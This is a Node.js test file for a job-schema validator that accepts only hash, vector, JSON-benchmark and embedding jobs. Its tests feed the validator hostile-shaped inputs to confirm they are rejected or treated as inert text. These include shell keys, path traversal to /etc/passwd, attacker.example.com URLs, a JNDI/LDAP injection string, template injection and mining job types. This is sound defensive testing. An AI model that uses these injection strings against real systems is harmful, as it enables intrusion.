import './test-setup.mjs';
import test from 'node:test';
import assert from 'node:assert/strict';
import { validateJobSchema, RassilonJobError, isExpired, isReasonableTimestamp, JOB_TYPES } from './src/lib/rassilon-job-schema.js';

function baseJob(overrides = {}) {
  return {
    jobId: 'job-0000000000000001',
    jobType: 'SAFE_CPU_TASK',
    issuerId: 'device-1',
    createdAt: new Date().toISOString(),
    expiresAt: new Date(Date.now() + 60_000).toISOString(),
    resourceBudget: { cpuPercent: 10, ramMb: 64, maxDurationSec: 5 },
    payload: { kind: 'HASH_BUFFER', data: { hex: 'deadbeef', algorithm: 'sha256' } },
    policyVersion: 'v1',
    signature: 'dGVzdA==',
    ...overrides,
  };
}

test('valid job passes schema validation', () => {
  assert.doesNotThrow(() => validateJobSchema(baseJob()));
});

test('JOB_TYPES is closed to SAFE_CPU_TASK + EMBEDDING_BATCH only (Phase 3 ceiling, mission §21)', () => {
  assert.deepEqual([...JOB_TYPES].sort(), ['EMBEDDING_BATCH', 'SAFE_CPU_TASK']);
});

test('unknown job type: rejected', () => {
  assert.throws(() => validateJobSchema(baseJob({ jobType: 'LLM_INFERENCE' })), (err) => {
    assert.ok(err instanceof RassilonJobError);
    assert.equal(err.code, 'job_type_not_supported');
    return true;
  });
});

test('crypto mining job types: explicitly NOT_SUPPORTED with a specific rejection reason', () => {
  for (const jobType of ['MINING', 'STRATUM', 'CRYPTO_MINING', 'HASHCASH_FOR_PROFIT']) {
    assert.throws(() => validateJobSchema(baseJob({ jobType })), (err) => {
      assert.equal(err.code, 'crypto_mining_not_supported');
      return true;
    }, `jobType=${jobType} should be rejected as crypto_mining_not_supported`);
  }
});

test('forbidden keys: command/shell/script/exec/executablePath anywhere in the object are rejected', () => {
  const forbiddenShapes = [
    { command: 'cmd.exe' },
    { shell: 'powershell' },
    { script: 'Invoke-Expression evil' },
    { executablePath: 'C:\\Windows\\System32\\cmd.exe' },
    { exec: true },
    { toolCall: {} },
  ];
  for (const shape of forbiddenShapes) {
    const job = baseJob({ payload: { kind: 'HASH_BUFFER', data: { hex: 'deadbeef', algorithm: 'sha256' }, ...shape } });
    assert.throws(() => validateJobSchema(job), RassilonJobError, `shape ${JSON.stringify(shape)} should be rejected`);
  }
});

test('forbidden keys: nested inside payload.data are also rejected (recursive check)', () => {
  const job = baseJob({ payload: { kind: 'HASH_BUFFER', data: { hex: 'deadbeef', algorithm: 'sha256', nested: { command: 'whoami' } } } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'forbidden_key');
    return true;
  });
});

test('payload validation: unknown field in SAFE_CPU_TASK payload is rejected', () => {
  const job = baseJob({ payload: { kind: 'HASH_BUFFER', data: { hex: 'deadbeef' }, extra: 'nope' } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'payload_unknown_field');
    return true;
  });
});

test('payload validation: unknown SAFE_CPU_TASK kind is rejected', () => {
  const job = baseJob({ payload: { kind: 'RUN_ARBITRARY_CODE', data: {} } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'safe_cpu_task_kind_invalid');
    return true;
  });
});

test('payload validation: HASH_BUFFER oversized hex is rejected', () => {
  const job = baseJob({ payload: { kind: 'HASH_BUFFER', data: { hex: 'ab'.repeat(2 * 1024 * 1024 + 1), algorithm: 'sha256' } } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'hash_buffer_too_large');
    return true;
  });
});

test('payload validation: HASH_BUFFER malformed hex is rejected', () => {
  const job = baseJob({ payload: { kind: 'HASH_BUFFER', data: { hex: 'not-hex-zz', algorithm: 'sha256' } } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'hash_buffer_hex_malformed');
    return true;
  });
});

test('payload validation: JSON_TRANSFORM_BENCH oversized item count is rejected', () => {
  const job = baseJob({ payload: { kind: 'JSON_TRANSFORM_BENCH', data: { items: new Array(10_001).fill(1) } } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'json_transform_items_count_invalid');
    return true;
  });
});

test('payload validation: VECTOR_MATH mismatched vector lengths rejected', () => {
  const job = baseJob({ payload: { kind: 'VECTOR_MATH', data: { vectors: [[1, 2], [1, 2, 3]] } } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'vector_math_vector_length_mismatch');
    return true;
  });
});

test('resource budget: missing/invalid fields rejected', () => {
  assert.throws(() => validateJobSchema(baseJob({ resourceBudget: { cpuPercent: 0, ramMb: 64, maxDurationSec: 5 } })), (err) => {
    assert.equal(err.code, 'resource_budget_cpu_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(baseJob({ resourceBudget: { cpuPercent: 10, ramMb: -1, maxDurationSec: 5 } })), (err) => {
    assert.equal(err.code, 'resource_budget_ram_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(baseJob({ resourceBudget: { cpuPercent: 10, ramMb: 64, maxDurationSec: 0 } })), (err) => {
    assert.equal(err.code, 'resource_budget_duration_invalid');
    return true;
  });
});

test('resource budget: unknown field rejected (no smuggled command-shaped budget field)', () => {
  const job = baseJob({ resourceBudget: { cpuPercent: 10, ramMb: 64, maxDurationSec: 5, gpuCommand: 'nvidia-smi' } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'resource_budget_unknown_field');
    return true;
  });
});

test('jobId format: rejects malformed ids', () => {
  assert.throws(() => validateJobSchema(baseJob({ jobId: '../../etc/passwd' })), (err) => {
    assert.equal(err.code, 'job_id_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(baseJob({ jobId: 'short' })), (err) => {
    assert.equal(err.code, 'job_id_invalid');
    return true;
  });
});

test('expiresAt must be after createdAt', () => {
  const now = new Date();
  assert.throws(() => validateJobSchema(baseJob({ createdAt: now.toISOString(), expiresAt: new Date(now.getTime() - 1000).toISOString() })), (err) => {
    assert.equal(err.code, 'expires_at_before_created_at');
    return true;
  });
});

test('isExpired: true once expiresAt has passed', () => {
  const job = baseJob({ createdAt: new Date(Date.now() - 5000).toISOString(), expiresAt: new Date(Date.now() - 1000).toISOString() });
  const validated = validateJobSchema(job);
  assert.equal(isExpired(validated), true);
});

test('isReasonableTimestamp: rejects createdAt far in the future (clock skew / forged timestamp)', () => {
  const job = validateJobSchema(baseJob({ createdAt: new Date(Date.now() + 10 * 60_000).toISOString(), expiresAt: new Date(Date.now() + 11 * 60_000).toISOString() }));
  assert.equal(isReasonableTimestamp(job), false);
});

test('signature field required and must be a non-empty string', () => {
  assert.throws(() => validateJobSchema(baseJob({ signature: '' })), (err) => {
    assert.equal(err.code, 'signature_required');
    return true;
  });
  assert.throws(() => validateJobSchema(baseJob({ signature: undefined })), (err) => {
    assert.equal(err.code, 'signature_required');
    return true;
  });
});

// ── EMBEDDING_BATCH payload schema (mission §6/§7/§38/§39 Phase 3) ────────

function embeddingJob(payloadOverrides = {}, envelopeOverrides = {}) {
  return baseJob({
    jobType: 'EMBEDDING_BATCH',
    payload: { texts: ['hello world'], model: 'nomic-embed-text', ...payloadOverrides },
    ...envelopeOverrides,
  });
}

test('EMBEDDING_BATCH: valid payload passes schema validation', () => {
  assert.doesNotThrow(() => validateJobSchema(embeddingJob()));
});

test('EMBEDDING_BATCH: unknown field is rejected', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ extraField: 'nope' })), (err) => {
    assert.equal(err.code, 'payload_unknown_field');
    return true;
  });
});

test('EMBEDDING_BATCH: model allowlist — only nomic-embed-text is accepted today', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ model: 'some-other-model' })), (err) => {
    assert.equal(err.code, 'embedding_model_not_allowed');
    return true;
  });
});

test('EMBEDDING_BATCH: model field rejects a path (mission §7 — no path/URL/registry source)', () => {
  const attempts = [
    'C:\\models\\evil.gguf',
    '../../etc/models/thing',
    'http://attacker.example.com/model',
    'https://huggingface.co/some/model',
    '\\\\attacker-host\\share\\model',
  ];
  for (const model of attempts) {
    assert.throws(() => validateJobSchema(embeddingJob({ model })), (err) => {
      assert.equal(err.code, 'embedding_model_not_allowed', `model="${model}" should be rejected`);
      return true;
    });
  }
});

test('EMBEDDING_BATCH: texts must be a non-empty array', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [] })), (err) => {
    assert.equal(err.code, 'embedding_text_count_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(embeddingJob({ texts: 'not-an-array' })), (err) => {
    assert.equal(err.code, 'embedding_texts_required');
    return true;
  });
});

test('EMBEDDING_BATCH: too many texts is rejected', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ texts: new Array(65).fill('x') })), (err) => {
    assert.equal(err.code, 'embedding_text_count_invalid');
    return true;
  });
});

test('EMBEDDING_BATCH: single huge text (over max chars per text) is rejected', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ texts: ['a'.repeat(8_001)] })), (err) => {
    assert.equal(err.code, 'embedding_text_too_long');
    return true;
  });
});

test('EMBEDDING_BATCH: total chars across all texts over the ceiling is rejected even if no single text is too long', () => {
  const texts = new Array(20).fill('x'.repeat(7_000)); // 20 * 7000 = 140,000 > 100,000 ceiling, each individually under 8,000
  assert.throws(() => validateJobSchema(embeddingJob({ texts })), (err) => {
    assert.equal(err.code, 'embedding_total_chars_too_large');
    return true;
  });
});

test('EMBEDDING_BATCH: wrong type for a text entry is rejected', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [123] })), (err) => {
    assert.equal(err.code, 'embedding_text_type_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [null] })), (err) => {
    assert.equal(err.code, 'embedding_text_type_invalid');
    return true;
  });
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [{}] })), (err) => {
    assert.equal(err.code, 'embedding_text_type_invalid');
    return true;
  });
});

test('EMBEDDING_BATCH: empty string text is rejected', () => {
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [''] })), (err) => {
    assert.equal(err.code, 'embedding_text_type_invalid');
    return true;
  });
});

test('EMBEDDING_BATCH: missing model field is rejected', () => {
  const job = { ...embeddingJob() };
  delete job.payload.model;
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'embedding_model_not_allowed');
    return true;
  });
});

// ── Security payload tests (mission §38) — no field grants any authority ──

test('EMBEDDING_BATCH: command/shell/script/executablePath keys anywhere in payload are rejected as forbidden keys', () => {
  const forbiddenShapes = [
    { command: 'cmd.exe' },
    { shell: 'powershell' },
    { script: 'evil.ps1' },
    { executablePath: 'C:\\Windows\\System32\\cmd.exe' },
  ];
  for (const shape of forbiddenShapes) {
    assert.throws(() => validateJobSchema(embeddingJob(shape)), (err) => {
      assert.equal(err.code, 'forbidden_key', `shape ${JSON.stringify(shape)} should be forbidden_key`);
      return true;
    });
  }
});

test('EMBEDDING_BATCH: url/endpoint/providerUrl fields are rejected as unknown fields (schema is closed to texts+model only)', () => {
  const shapes = [
    { url: 'http://attacker.example.com' },
    { endpoint: 'http://attacker.example.com' },
    { providerUrl: 'http://attacker.example.com' },
  ];
  for (const shape of shapes) {
    assert.throws(() => validateJobSchema(embeddingJob(shape)), (err) => {
      assert.equal(err.code, 'payload_unknown_field', `shape ${JSON.stringify(shape)} should be payload_unknown_field`);
      return true;
    });
  }
});

test('EMBEDDING_BATCH: path-traversal, drive-letter, UNC, javascript:, and template-injection shapes in a TEXT are inert (just embedded as text, no special authority)', () => {
  // These are legitimate strings a user might want embedded (e.g. someone
  // embedding a sentence that happens to contain a path) — the schema
  // correctly accepts them as ordinary text content, since EMBEDDING_BATCH
  // never interprets text as a path/command/URL anywhere in the pipeline.
  // This test documents and locks in that non-interpretation.
  const dangerousLookingTexts = [
    '../../etc/passwd',
    'C:\\Windows\\System32\\cmd.exe',
    '\\\\attacker-host\\share',
    'javascript:alert(1)',
    '${7*7}',
    '${jndi:ldap://attacker.example.com/a}',
  ];
  const job = embeddingJob({ texts: dangerousLookingTexts });
  assert.doesNotThrow(() => validateJobSchema(job));
});

test('EMBEDDING_BATCH: deeply nested object as a text entry is rejected (wrong type, not a string)', () => {
  const deepObject = { a: { b: { c: { d: { e: 'nope' } } } } };
  assert.throws(() => validateJobSchema(embeddingJob({ texts: [deepObject] })), (err) => {
    assert.equal(err.code, 'embedding_text_type_invalid');
    return true;
  });
});

test('EMBEDDING_BATCH: resource budget still validated the same as any other job type', () => {
  const job = embeddingJob({}, { resourceBudget: { cpuPercent: 10, ramMb: -5, maxDurationSec: 5 } });
  assert.throws(() => validateJobSchema(job), (err) => {
    assert.equal(err.code, 'resource_budget_ram_invalid');
    return true;
  });
});
